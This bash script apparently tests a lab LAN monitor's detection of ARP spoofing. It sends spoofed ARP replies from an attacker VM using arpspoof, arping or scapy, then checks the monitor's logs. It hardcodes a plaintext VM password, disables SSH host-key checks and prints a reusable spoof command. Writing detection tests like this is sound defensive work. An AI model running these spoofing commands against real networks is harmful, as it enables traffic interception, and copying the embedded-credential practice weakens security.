#!/bin/bash
# ARP Spoofing Attack Detection Test
# Tests ARP spoofing detection capabilities

set -e

# VM Credentials
MONITOR_IP="192.168.128.8"
VICTIM_IP="192.168.128.6"
ATTACKER_IP="192.168.128.101"

MONITOR_USER="monitor"
VICTIM_USER="achu2"
ATTACKER_USER="achu"
VM_PASSWORD="achu2006"

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${BLUE}════════════════════════════════════════${NC}"
echo -e "${BLUE}ARP Spoofing Attack Detection Test${NC}"
echo -e "${BLUE}════════════════════════════════════════${NC}"
echo ""

echo -e "${YELLOW}[Step 1] Monitoring for ARP attacks...${NC}"
echo "Tail logs on Monitor VM (running in background)..."
echo ""

# Start monitoring in background
sshpass -p "$VM_PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $MONITOR_USER@$MONITOR_IP "
    cd ~/securenet
    tail -f lan_security.log 2>/dev/null | grep -E 'ARP|Spoofing' &
    TAIL_PID=\$!
    
    # Run for 20 seconds then kill
    sleep 20
    kill \$TAIL_PID 2>/dev/null || true
" 2>/dev/null &

MONITOR_PID=$!

sleep 2

echo -e "${YELLOW}[Step 2] Executing ARP spoofing attack...${NC}"
echo "Sending ARP packets from Attacker VM..."
echo ""

sshpass -p "$VM_PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $ATTACKER_USER@$ATTACKER_IP "
    # ARP spoofing test - spoof Monitor as Victim
    echo 'Performing ARP spoof: claiming to be Victim (192.168.128.6)'
    
    # Use arpspoof or arping to send ARP packets
    if command -v arpspoof &> /dev/null; then
        echo 'Using arpspoof tool...'
        timeout 10 sudo arpspoof -i eth0 -t 192.168.128.8 192.168.128.6 2>/dev/null || true
    elif command -v arping &> /dev/null; then
        echo 'Using arping tool...'
        timeout 10 sudo arping -I eth0 -c 5 192.168.128.8 2>/dev/null || true
    else
        echo 'Using scapy for ARP spoofing...'
        python3 << 'PYTHON_SCRIPT'
import sys
try:
    from scapy.all import ARP, Ether, sendp
    import time
    
    # ARP spoofing: claim to be victim
    victim_ip = '192.168.128.6'
    monitor_ip = '192.168.128.8'
    attacker_mac = '02:42:c0:a8:80:65'  # Placeholder
    
    print(f'Sending ARP spoof packets: claiming {victim_ip} is at {attacker_mac}')
    
    for i in range(5):
        arp = ARP(op='is-at', pdst=monitor_ip, psrc=victim_ip, hwdst='ff:ff:ff:ff:ff:ff')
        pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / arp
        sendp(pkt, iface='eth0', verbose=False)
        print(f'  Sent ARP spoof packet {i+1}/5')
        time.sleep(1)
    
    print('ARP spoofing attack completed!')
except ImportError:
    print('Scapy not available, trying arp-scan...')
    import subprocess
    subprocess.run(['sudo', 'arp-scan', '-l'], timeout=5)
except Exception as e:
    print(f'Error: {e}')
PYTHON_SCRIPT
    fi
" 2>/dev/null

echo -e "${GREEN}✓ ARP attack executed${NC}"
echo ""

sleep 2

# Wait for monitor to finish
wait $MONITOR_PID 2>/dev/null || true

echo -e "${BLUE}════════════════════════════════════════${NC}"
echo -e "${YELLOW}[Step 3] Checking detection results...${NC}"
echo -e "${BLUE}════════════════════════════════════════${NC}"
echo ""

echo "Recent logs with ARP detections:"
sshpass -p "$VM_PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $MONITOR_USER@$MONITOR_IP "
    cd ~/securenet
    echo '📊 Last 20 log entries mentioning ARP:'
    tail -100 lan_security.log | grep -E 'ARP|Spoof|anomaly' || tail -10 lan_security.log
" 2>/dev/null

echo ""
echo -e "${GREEN}════════════════════════════════════════${NC}"
echo -e "${GREEN}✓ ARP Attack Test Complete!${NC}"
echo -e "${GREEN}════════════════════════════════════════${NC}"
echo ""

echo "📝 Summary:"
echo "  - ARP spoofing attack sent from Attacker VM (192.168.128.101)"
echo "  - Target: Monitor VM (192.168.128.8)"
echo "  - Detection system monitored for ARP spoofing signatures"
echo ""

echo "To run continuous ARP monitoring:"
echo "  sshpass -p achu2006 ssh monitor@192.168.128.8 'cd ~/securenet && tail -f lan_security.log | grep ARP'"
echo ""

echo "To trigger another attack:"
echo "  sshpass -p achu2006 ssh achu@192.168.128.101 'sudo arpspoof -i eth0 -t 192.168.128.8 192.168.128.6'"
